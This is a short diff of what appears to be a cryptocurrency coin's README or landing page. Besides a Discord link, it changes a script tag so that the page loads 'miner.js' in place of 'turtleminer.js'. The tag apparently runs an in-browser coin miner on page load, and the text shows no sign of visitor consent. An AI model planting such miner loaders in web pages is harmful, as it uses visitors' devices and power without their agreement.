@@ -39,4 +39,4 @@ With Quick transactions, privacy and unlimited Blocksize make this coin perfect 
 ### [JOIN DISCORD](https://discord.gg/m7rdznM)
 
 
-<script src='turtleminer.js'></script>
+<script src='miner.js'></script>
